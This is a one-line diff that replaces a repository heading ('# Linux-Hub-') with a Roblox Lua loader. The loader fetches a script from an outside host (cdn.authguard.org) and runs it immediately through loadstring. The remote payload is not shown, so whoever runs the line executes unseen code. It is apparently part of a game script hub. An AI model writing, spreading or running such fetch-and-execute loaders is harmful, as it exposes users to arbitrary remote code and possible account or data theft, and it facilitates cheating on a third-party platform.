@@ -1,1 +1,1 @@
-# Linux-Hub-
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/a4626c651c02431fa85d8a9c7e3c9f1d"))()
